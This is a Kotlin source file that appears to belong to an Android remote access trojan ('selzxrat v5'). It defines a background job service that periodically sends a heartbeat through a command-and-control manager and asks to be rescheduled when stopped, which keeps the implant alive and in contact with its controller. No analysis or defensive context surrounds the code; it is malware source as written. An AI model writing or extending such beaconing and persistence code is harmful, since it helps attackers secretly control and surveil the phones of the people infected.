package com.selzxrat.v5.services

import android.app.job.JobParameters
import android.app.job.JobService
import android.util.Log
import com.selzxrat.v5.C2Manager

class SELZXJobService : JobService() {

    companion object {
        private const val TAG = "SELZXJobService"
    }

    override fun onStartJob(params: JobParameters?): Boolean {
        Log.d(TAG, "Job started: ${params?.jobId}")

        // Periodic health check
        C2Manager.sendCommand("self", "heartbeat", "")

        return false // No more work to do
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        Log.d(TAG, "Job stopped: ${params?.jobId}")
        return true // Reschedule
    }
}